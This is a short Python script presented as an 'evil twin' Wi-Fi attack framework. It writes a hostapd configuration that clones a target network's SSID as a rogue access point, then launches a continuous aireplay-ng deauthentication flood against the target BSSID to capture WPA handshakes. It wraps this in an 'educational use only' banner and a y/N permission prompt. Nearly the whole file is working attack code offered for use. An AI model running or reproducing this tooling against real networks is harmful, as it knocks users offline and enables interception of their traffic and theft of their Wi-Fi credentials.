#!/usr/bin/env python3
import subprocess
import argparse
import sys
from scapy.all import *

# ASCII ART
AAKASH_ART = r"""
 █████╗  █████╗ ██╗  ██╗ █████╗ ███████╗██╗  ██╗
██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔════╝██║  ██║
███████║██║  ██║█████╔╝ ███████║███████╗███████║
██╔══██║██║  ██║██╔═██╗ ██╔══██║╚════██║██╔══██║
██║  ██║╚█████╔╝██║  ██╗██║  ██║███████║██║  ██║
╚═╝  ╚═╝ ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
        E V I L   T W I N   F R A M E W O R K
           === FOR EDUCATIONAL USE ONLY ===
"""

def print_warning():
    print("\033[91m" + AAKASH_ART + "\033[0m")
    print("\033[91;1m⚠️  WARNING: Use only with explicit permission. ILLEGAL otherwise! ⚠️\033[0m\n")

def ethical_check():
    consent = input("\033[93m[?] Do you have written permission to test this network? (y/N): \033[0m").strip().lower()
    if consent != "y":
        print("\033[91m[!] Exiting. Ethical hacking requires authorization!\033[0m")
        sys.exit(1)

def create_evil_twin(ssid, interface):
    """Create fake AP using hostapd"""
    with open("config/hostapd.conf", "w") as f:
        f.write(f"interface={interface}mon\n")
        f.write(f"ssid={ssid}\n")
        f.write("channel=6\ndriver=nl80211\n")
    subprocess.run(["sudo", "hostapd", "config/hostapd.conf", "-B"])

def capture_handshake(bssid, interface):
    """Deauth attack to capture WPA handshake"""
    print("\033[94m[*] Starting deauthentication attack...\033[0m")
    subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, f"{interface}mon"])

def main():
    print_warning()
    ethical_check()
    
    parser = argparse.ArgumentParser(
        description="A A K A S H Attack - Evil Twin Framework",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface (e.g., wlan0)")
    parser.add_argument("-s", "--ssid", required=True, help="Target SSID to clone")
    parser.add_argument("-b", "--bssid", required=True, help="Target BSSID (MAC address)")
    args = parser.parse_args()

    print("\033[92m[+] Starting attack sequence...\033[0m")
    create_evil_twin(args.ssid, args.interface)
    capture_handshake(args.bssid, args.interface)
    print("\033[92m[+] Handshake capture initiated. Check logs/\033[0m")

if __name__ == "__main__":
    main()